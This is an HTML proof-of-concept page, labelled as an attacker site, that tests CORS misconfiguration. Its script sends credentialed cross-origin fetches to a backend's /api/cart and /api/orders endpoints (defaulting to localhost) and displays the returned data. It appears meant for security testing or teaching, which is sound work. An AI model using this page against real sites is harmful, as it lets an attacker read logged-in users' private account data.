<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Attacker Site - CORS Credential Demo</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 24px; }
    h1 { color: #C70039; }
    .controls { margin: 12px 0; }
    textarea { width: 100%; height: 160px; font-family: monospace; }
    button { padding: 8px 14px; background: #FF5733; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    button:hover { background: #C70039; }
    input[type=text] { padding: 8px; width: 420px; }
    .row { margin: 6px 0; }
    .cookie { margin: 8px 0; color: #444; }
  </style>
</head>
<body>
  <h1>Attacker Site – CORS Credential Demo</h1>
  <div class="cookie">document.cookie: <code id="ck"></code></div>
  <div class="controls">
    <div class="row">
      Backend URL:
      <input id="api" type="text" value="http://localhost:5000" />
    </div>
    <div class="row">
      <button id="btnCart">Fetch /api/cart (credentials)</button>
      <button id="btnOrders">Fetch /api/orders (credentials)</button>
    </div>
  </div>
  <h3>Result</h3>
  <textarea id="out" readonly></textarea>

  <script>
    const out = document.getElementById('out');
    const api = () => document.getElementById('api').value.replace(/\/+$/,'');
    const log = (label, data) => {
      out.value = label + ":\n" + (typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    };
    document.getElementById('ck').textContent = document.cookie || '(empty)';

    async function call(path) {
      try {
        const res = await fetch(api() + path, {
          method: 'GET',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' }
        });
        const text = await res.text();
        try {
          const json = JSON.parse(text);
          log(`${path} [${res.status}]`, json);
        } catch {
          log(`${path} [${res.status}]`, text);
        }
      } catch (e) {
        log(`${path} [error]`, String(e));
      }
    }

    document.getElementById('btnCart').onclick = () => call('/api/cart');
    document.getElementById('btnOrders').onclick = () => call('/api/orders');
  </script>
</body>
</html>
